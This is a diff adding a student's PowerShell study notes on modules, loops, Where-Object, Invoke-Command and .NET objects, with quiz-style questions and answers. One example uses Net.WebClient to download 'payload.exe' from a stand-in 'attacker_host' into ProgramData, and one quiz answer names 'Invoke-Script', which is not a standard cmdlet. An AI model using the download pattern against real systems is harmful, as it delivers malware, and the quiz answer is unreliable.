@@ -129,3 +129,65 @@ New-item parameter with -itemtype used to create new folder
 ------------------------------------------------------------
 new-item lee -itemtype directory
 ______________________________________________________________________________________________________________________________________________________________________
+powershell modules (.psm)
+-----------------
+> Get-module -listavailabe
+
+> import-module .\module.psm1
+
+Popular powershell exploitation framework > powersploit
+
+Which cmdlet is used to install a PowerShell module from an online repository? > install-module
+What is the purpose of a PowerShell module? > to define custom functions and cmdlets
+______________________________________________________________________________________________________________________________________________________________________
+Powershell scripts
+------------------
+using foreach()
+
+$services=get-service
+foreach ($result in $services){$result.displayname}
+
+foreach-object{} and where-object{}
+--------------------------------------
+It will display the get-service's displayname
+
+You can also write with ForEach-Object{} to create a foreach() loop
+
+> Get-service | foreach-object {$_.Name}
+
+Where-object allows us to select object
+---------------------------------------
+> Get-childitem C:\Powershell | where-object {$_.Name -match "pdf"}
+
+It will list get-childitem's name that matches with pdf
+
+Which cmdlet is commonly used to execute a PowerShell script from within another script? > Invoke-Script
+
+# Example: Using Invoke-Command to run a script locally
+>Invoke-Command -ScriptBlock { & "C:\Path\To\OtherScript.ps1" }
+
+# Example: Using Invoke-Command to run a script on a remote computer
+Invoke-Command -ComputerName RemoteComputerName -ScriptBlock { & "C:\Path\To\OtherScript.ps1" }
+
+What is the purpose of parameters in a PowerShell script? > To define variables that are passed to the script when it is executed
+______________________________________________________________________________________________________________________________________________________________________
+powershell Object
+-----------------
+In PowerShell, everything is treated as an object, which is a key aspect of its design. Objects in PowerShell are instances of .NET classes, and they have properties (data) and methods (actions) that can be accessed and manipulated.
+
+As an example of creating a webclient-download object based on a .NET class with the "New-Object" cmdlet, we can use the “Net.WebClient" .NET system class to download a file to a target system with the following code:
+
+PS C:\> $webclient = New-Object System.Net.WebClient
+PS C:\> $payload_url = "https://attacker_host/payload.exe"
+PS C:\> $file = "C:\ProgramData\payload.exe"
+PS C:\> $webclient.DownloadFile ($payload_url, $file)
+
+.DownloadFile is a method.
+______________________________________________________________________________________________________________________________________________________________________
+
+
+
+
+
+
+
